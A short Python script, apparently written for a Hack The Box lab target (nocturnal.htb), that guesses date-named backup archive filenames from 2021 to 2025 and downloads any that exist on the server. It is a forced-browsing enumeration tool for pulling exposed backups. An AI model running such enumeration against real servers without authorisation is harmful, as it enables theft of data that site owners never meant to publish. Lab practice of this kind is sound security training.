#!python
import urllib.request

for year in range(2021,2026):
    for month in range(1, 13):
        for day in range(1,32):
            filename = f"backup_{year}-{month:02}-{day:02}.zip"
            try:
                print(f"{filename}",  end="\r")
                urllib.request.urlretrieve("http://nocturnal.htb/backups/" + filename, filename)
                print(f"found: {filename}")
            except: pass
